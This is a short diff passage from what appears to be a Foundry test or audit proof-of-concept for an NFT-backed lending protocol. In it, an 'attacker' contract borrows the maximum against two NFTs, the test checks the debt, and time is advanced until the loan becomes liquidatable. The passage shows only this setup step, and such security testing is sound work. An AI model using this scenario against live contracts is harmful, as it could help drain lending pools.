+        tokenIds[0] = 10;
+        tokenIds[1] = 11;
+        // loan max with nft-10 and nft-11
+        attacker.addAndLoanMax(tokenIds, getLowerOracle());
+
+        // confirm the debt: 100
+        uint256 initDebt = 100e18;
+        info = controller.vaultInfo(address(attacker), nft);
+        assertEq(info.debt, initDebt);
+
+        // price dropped to 99.99u, the loan is liquidatable now
+        vm.warp(block.timestamp + 1 hours);
